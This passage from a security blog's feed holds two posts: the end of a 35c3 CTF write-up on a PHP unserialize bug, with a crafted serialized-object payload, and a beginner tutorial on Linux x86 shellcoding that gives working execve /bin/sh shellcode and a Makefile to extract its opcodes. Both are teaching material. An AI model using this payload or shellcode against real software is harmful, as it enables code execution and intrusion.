&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;unserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Well that was unexpected…'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We then run &lt;code class=&quot;highlighter-rouge&quot;&gt;php php.php&lt;/code&gt; and get the serialized string. &lt;code class=&quot;highlighter-rouge&quot;&gt;O:1:&quot;B&quot;:0:{}&lt;/code&gt;. To actually get the program to print the flag
we have to change the &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; in the serialized string too a &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;. After that you run the program and paste in &lt;code class=&quot;highlighter-rouge&quot;&gt;O:1:&quot;B&quot;:1:{}&lt;/code&gt; into stdin.
The program responds with the flag text.&lt;/p&gt;

&lt;h2 id=&quot;how-this-works&quot;&gt;How this works.&lt;/h2&gt;
&lt;h3 id=&quot;magic-methods-and-deserilization-bugs&quot;&gt;Magic methods and deserilization bugs&lt;/h3&gt;
&lt;p&gt;This is a deserilization bug. A deserilization bug occurs when serialized objects are managed incorrectly.
So when the code calls &lt;code class=&quot;highlighter-rouge&quot;&gt;unserialize()&lt;/code&gt; on a line from stdin it is inherently trusting the user to supply a serialized object.
That is part one of the vulnerability, what makes deserilization bugs dangerous is the second part. Look at &lt;code class=&quot;highlighter-rouge&quot;&gt;class B&lt;/code&gt;, specifically the &lt;code class=&quot;highlighter-rouge&quot;&gt;__destruct&lt;/code&gt; method.
&lt;code class=&quot;highlighter-rouge&quot;&gt;__destruct&lt;/code&gt; is a magic method or a method that is run without being called by the programer. In this case it is called when the object is deleted when the runtime determines that the object is nolonger needed.
By having control over the string that gets passed too &lt;code class=&quot;highlighter-rouge&quot;&gt;unserialize&lt;/code&gt; we can create a new instance of &lt;code class=&quot;highlighter-rouge&quot;&gt;class B&lt;/code&gt; and control its inputs.&lt;/p&gt;

&lt;h3 id=&quot;php-object-serialization-syntax&quot;&gt;Php object serialization syntax&lt;/h3&gt;
&lt;p&gt;This part is something that you need to have a tiny understading of, but not a large one.
Our exploit for the serialized object is &lt;code class=&quot;highlighter-rouge&quot;&gt;O:1:&quot;B&quot;:1:{}&lt;/code&gt; but the program prints out &lt;code class=&quot;highlighter-rouge&quot;&gt;O:1:&quot;B&quot;:0:{}&lt;/code&gt; when echo out the serialized text.
To put this simply the string starts with an &lt;code class=&quot;highlighter-rouge&quot;&gt;O&lt;/code&gt; for object then is followed by a &lt;code class=&quot;highlighter-rouge&quot;&gt;:&lt;/code&gt; which acts a seperator. The number after the separator is the number of arguments that &lt;code class=&quot;highlighter-rouge&quot;&gt;class B&lt;/code&gt; takes. After that we have a &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;B&quot;&lt;/code&gt; which means its a &lt;code class=&quot;highlighter-rouge&quot;&gt;class B&lt;/code&gt; object. Followed by another seperator and then the “magic” part.
This number is the amount values in &lt;code class=&quot;highlighter-rouge&quot;&gt;class B&lt;/code&gt;. When we call &lt;code class=&quot;highlighter-rouge&quot;&gt;serialize&lt;/code&gt; on our instance of &lt;code class=&quot;highlighter-rouge&quot;&gt;class B&lt;/code&gt; with the changing of &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; to one we cause an error in the &lt;code class=&quot;highlighter-rouge&quot;&gt;unserialize&lt;/code&gt; function which allows are function to be destructed and print the flag. Note the &lt;code class=&quot;highlighter-rouge&quot;&gt;@&lt;/code&gt; silences the error thrown by the function.
Thanks to @sk1di3 for pointing this out to me. I had originally thought that it was something about php not recognizing the global variable.
If you want a more indepth explination of php serialization check out &lt;a href=&quot;http://www.phpinternalsbook.com/classes_objects/serialization.html&quot;&gt;php internals&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">35c3c CTF: php I recently participated in the 35c3c ctf. I have enough time to do a quick write up and this vulnerability class is intriguing to me. First impressions When first downloading the included file there is a tar archive with one file. The file is a simple php script (the game ran it on a nc server). Opening up the file I can clearly see the vaulnarability. Its contents are as follows.</summary></entry><entry><title type="html">Basic shellcoding for linux on x86</title><link href="http://localhost:4000/shellcoding/linux/x86/2018/11/15/Shellcoding-for-linux-on-x86.html" rel="alternate" type="text/html" title="Basic shellcoding for linux on x86" /><published>2018-11-15T00:00:00-05:00</published><updated>2018-11-15T00:00:00-05:00</updated><id>http://localhost:4000/shellcoding/linux/x86/2018/11/15/Shellcoding-for-linux-on-x86</id><content type="html" xml:base="http://localhost:4000/shellcoding/linux/x86/2018/11/15/Shellcoding-for-linux-on-x86.html">&lt;h3 id=&quot;beginning&quot;&gt;Beginning&lt;/h3&gt;
&lt;p&gt;Writing shellcode is an excellent way to learn more about assembly language and how a program communicates with
the underlying OS. Put simply shellcode is code that is injected into a running program to make it do something
it was not made to do. Normally this is to spawn a shell, but any code made to run after a bug in a program is
exploited counts as shellcode.&lt;/p&gt;

&lt;p&gt;Before you begin writing shellcode it is a good idea to read a few tutorials on writing assembly programs.
A good reference would be &lt;a href=&quot;https://www.tutorialspoint.com/assembly_programming/&quot;&gt;tutorial points&lt;/a&gt;. To compile the assembly code for this tutorial I used nasm. To make the process of compiling the shellcode and extracting the op codes easier I have included a makefile to
aid in the process.&lt;/p&gt;

&lt;h3 id=&quot;hello-world&quot;&gt;Hello world&lt;/h3&gt;
&lt;p&gt;Lets begin with a shellcode that prints out to the screen hello world.
Here is the end shellcode. Save it in a file named &lt;code class=&quot;highlighter-rouge&quot;&gt;shellcode.asm&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt;section .text
    global _start

_start:
    xor eax, eax
    push eax
    push 0x0A646c72 ; hello world
    push 0x6f77206f
    push 0x6c6c6548
    mov bl, 0x1 ; stdout
    mov ecx, esp ; the address of hello world
    mov dl, 0xe ; the length of hello world
    mov al, 0x4  ; sys_write syscall
    int 0x80 ; call the syscall
    mov al, 0x1 ; sys_exit syscall
    int 0x80 ; call the syscall&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The make file is as follows&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-make&quot; data-lang=&quot;make&quot;&gt;&lt;span class=&quot;nl&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;shellcode&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;shellcode.o&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;shellcode.asm&lt;/span&gt;
	nasm &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; elf shellcode.asm

&lt;span class=&quot;nl&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;shellcode.o&lt;/span&gt;
	ld &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; elf_i386 &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; shellcode shellcode.o

&lt;span class=&quot;nl&quot;&gt;.PHONY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;clean&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;clean&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	rm shellcode.o
	rm shellcode
&lt;span class=&quot;nl&quot;&gt;.PHONY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;raw&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;raw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\\x'&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\\x'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; objdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; shellcode | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;^ &quot;&lt;/span&gt; | cut &lt;span class=&quot;nt&quot;&gt;-f2&lt;/span&gt; | tr &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; | tr &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\n'&lt;/span&gt; | sed &lt;span class=&quot;s1&quot;&gt;'s/.\{2\}/&amp;amp;\\x /g'&lt;/span&gt;| head &lt;span class=&quot;nt&quot;&gt;-c-3&lt;/span&gt; | tr &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;To compile this shellcode run &lt;code class=&quot;highlighter-rouge&quot;&gt;make all&lt;/code&gt; then run &lt;code class=&quot;highlighter-rouge&quot;&gt;./shellcode&lt;/code&gt;. You should see Hello world outputted to the screen.
This is a shellcode that writes hello world. We start out by XORing eax to zero out the register. We then push eax onto the stack as a null byte. Then we push hello
world onto the stack. Hello world is pushed onto the stack in reverse because x86 is little endian. Next comes the part that makes the shellcode a little more involved.
When we move hex 0x1 into what would normally be the ebx we instead use bl. We are using the 8 bit register portion of ebx so we do not have null bytes in our shellcode.
Why wouldn’t we want null bytes in our shellcode? The reason, put simply, is functions like &lt;code class=&quot;highlighter-rouge&quot;&gt;strncpy()&lt;/code&gt; will stop copping a string when they reach a nullbyte. This would result in our shellcode being cut off and not being executed
correctly. We then copy the address of hello world into ecx and the length of our shellcode into dl. After this we move 0x4 into al. This sets the syscall we are using to the write syscall. We then use int 0x80 which tells the
kernel to call our syscall. After this we set al to 0x1(The exit syscall) which we then use int 0x80 again to tell the kernel we want this process to be “exited”. If you are confused don’t worry I will explain in the upcoming
section.&lt;/p&gt;

&lt;h3 id=&quot;syscalls-op-codes-and-registers-oh-my-featuring-the-stack&quot;&gt;Syscalls, op-codes, and registers. Oh my (featuring the stack)&lt;/h3&gt;
&lt;h2 id=&quot;syscalls&quot;&gt;Syscalls&lt;/h2&gt;
&lt;p&gt;In the explanation of the hello world shellcode above you may have been wondering what a syscall is. A syscall is a way for a process to communicate with the underlying operating system. This makes it easier for programmers to say
write to a file or change the permissions of a file. Instead of having to spend time implementing their own solution programmers were able to relay on the operating system to handle certain tasks. Syscalls are called in x86 assembly by setting the eax register to the syscall number. The syscall number is just a number that is associated with a certain syscall. For example the syscall &lt;code class=&quot;highlighter-rouge&quot;&gt;sys_exit&lt;/code&gt; has the hex value of 0x1.
Syscalls are used in shellcode because the process dose not have to find and load in a shared object or have statically linked code to obtain functionality outside of the program. Syscalls are always there for our shellcode to call. In the hello world shellcode
I use two syscalls of interest &lt;code class=&quot;highlighter-rouge&quot;&gt;sys_write&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;sys_exit&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;sys_write&lt;/code&gt; writes a string to a file descriptor(in our case 1 for stdout) and &lt;code class=&quot;highlighter-rouge&quot;&gt;sys_exit&lt;/code&gt; simply “exits” the program like &lt;code class=&quot;highlighter-rouge&quot;&gt;exit();&lt;/code&gt; in c.
A great reference for syscalls on linux and their corresponding numbers can be found &lt;a href=&quot;https://syscalls.kernelgrok.com/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;opcodes&quot;&gt;Opcodes&lt;/h2&gt;
&lt;p&gt;Lets talk about op-codes. Op-codes are the hexadecimal representation of the instructions that we write in assembly. You can extract the opcode for our shell code using the &lt;code class=&quot;highlighter-rouge&quot;&gt;make raw&lt;/code&gt; command. This is just a recipe inside of the make file I added to make the process easier to understand.
The op-codes that are extracted are the final payload that gets sent to a target that is being exploited. In shellcode you will notice that (for the most part) you will never see 0x00 in them. 0x00 is a null byte and null bytes in shellcode can lead to unreliable shellcode because
shellcode with null bytes might have opcodes cut off by functions like &lt;code class=&quot;highlighter-rouge&quot;&gt;strcpy()&lt;/code&gt;. If our shellcode has null bytes and is cut off before the ending it could lose crucial functionality. This brings us to our next section.&lt;/p&gt;

&lt;h2 id=&quot;registers&quot;&gt;Registers&lt;/h2&gt;
&lt;p&gt;Now to talk about registers. Registers are essentially tiny variables that exist on the cpu. They can be used to store data or addresses that point to data.
On x86 there are 7 general purpose registers. Of that 7 only 4 are normally used by the programmer(ESP, EBP and ESI have their own special uses). The other 4 are EAX, EBX, ECX, and EDX. Each one can store 32 bits(or 4 bytes) of data. Each of those registers has three smaller registers that can be used to access the lower bits
of the registers. For example the EAX register has AX, AH, and AL. AX is used to access the lower 16 bits of EAX. AL is used to access the lower 8 bits of EAX and AH is used to access the higher 8 bits.
So why is this important for writing shellcode? Remember back to why null bytes are a bad thing. Using the smaller portions of a register allow us to use &lt;code class=&quot;highlighter-rouge&quot;&gt;mov al, 0x1&lt;/code&gt; and not produce a null byte.
If we would have done &lt;code class=&quot;highlighter-rouge&quot;&gt;mov eax, 0x1&lt;/code&gt; it would have produced null bytes in our shellcode. EBP, ESP and EIP are each used for a special purpose. EBP is used to point to the base of the stack(explained below), ESP is used to point to the top of the stack(also explained below) and EIP is the instruction pointer. The instruction pointer just points to the address of the next instruction to be executed.&lt;/p&gt;

&lt;h2 id=&quot;the-stack&quot;&gt;The stack&lt;/h2&gt;
&lt;p&gt;The stack is a portion of memory that programmers can use to store large amounts of data. When a programmer wants to put data onto the stack they use the &lt;code class=&quot;highlighter-rouge&quot;&gt;push &amp;lt;data&amp;gt;&lt;/code&gt; instruction. If they want to retrieve data from the stack they would use the &lt;code class=&quot;highlighter-rouge&quot;&gt;pop &amp;lt;dest&amp;gt;&lt;/code&gt; instruction. The stack is a first in last out(FILO) data structure. A simple way of visualizing this is to think of a pile of books.
The books on bottom of the pile where placed there first. To get to the book on the bottom of the pile of books you would have to take off the books on top of it.  The base of the stack(most recent thing that is pushed on to the stack) is pointed to by the address ebp and the top of the stack is pointed to by ESP. In our hello world shellcode we can see the instruction &lt;code class=&quot;highlighter-rouge&quot;&gt;mov ecx,esp&lt;/code&gt;. Here we are copying the address of the top of the stack into ECX. If you look at the push instructions we push the newline character then d on to the stack first.
This is because of the Endienness of x86 and the orientation of the stack. You still maybe wondering why it is that the stack is used in shellcode to store data. The reason is that shellcode do not have access to the data section that normal assembly programs would have. To be able to have our own data we use the &lt;code class=&quot;highlighter-rouge&quot;&gt;push&lt;/code&gt; instruction along with the hexadecimal representation of our characters to store data that would need to be used by our shellcode.&lt;/p&gt;

&lt;h3 id=&quot;putting-it-all-together&quot;&gt;Putting it all together&lt;/h3&gt;
&lt;p&gt;Okay so now that we have a hold on how to write shellcode. Lets write a shell code that calls &lt;code class=&quot;highlighter-rouge&quot;&gt;sys_execve&lt;/code&gt; to run &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;. So here is the assembly code.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt;section .text
    global _start

_start:
    xor eax, eax; safe null
    push eax; push null byte onto stack
    push 0x68732f2f ; push /bin//sh
    push 0x6e69622f
    mov ebx,esp ; set ebx to out cmd
    mov ecx, eax; no args
    mov edx, eax ; no args again
    mov al, 0xb ; set sys_execve
    int 0x80&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Save this code into &lt;code class=&quot;highlighter-rouge&quot;&gt;shellcode.asm&lt;/code&gt; and then use &lt;code class=&quot;highlighter-rouge&quot;&gt;make all&lt;/code&gt; to compile it. To test the shellcode you can run &lt;code class=&quot;highlighter-rouge&quot;&gt;./shellcode&lt;/code&gt; like before. You might wonder why we are using &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin//sh&lt;/code&gt; instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;. We use &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin//sh&lt;/code&gt; because we want our push - es to have a number divisible by 4 so we can push our data on the stack with out null bytes.
We then use ebx to point to our shellcode. After that we set the args to null and the number of args to null because we are calling /bin//sh without any arguments. Then after that we set al to hex 11 and finish off with an &lt;code class=&quot;highlighter-rouge&quot;&gt;int 0x80&lt;/code&gt; to run our shellcode.&lt;/p&gt;

&lt;h3 id=&quot;useful-links&quot;&gt;Useful links&lt;/h3&gt;
&lt;p&gt;I am a firm believer that the more sources of knowledge that one person has at their fingers makes it easier to learn. So here is a list of excellent tutorials other than mine to continue or reaffirm your shellcoding journey.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://0x00sec.org/t/linux-shellcoding-part-1-0/289&quot;&gt;0x00sec&lt;/a&gt; a different x86 linux shellcoding tutorial.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/docs/english/21013-shellcoding-in-linux.pdf&quot;&gt;Exploit db&lt;/a&gt; Exploitdb’s tutorial on linux shellcoding. Nice visuals and talks more about the commands I use in &lt;code class=&quot;highlighter-rouge&quot;&gt;make raw&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;All the shellcode will be up on my &lt;a href=&quot;https://github.com/Rayoflightz&quot;&gt;github&lt;/a&gt;. Thanks for reading and as always happy hacking.&lt;/p&gt;</content><author><name></name></author><summary type="html">Beginning Writing shellcode is an excellent way to learn more about assembly language and how a program communicates with the underlying OS. Put simply shellcode is code that is injected into a running program to make it do something it was not made to do. Normally this is to spawn a shell, but any code made to run after a bug in a program is exploited counts as shellcode.</summary></entry></feed>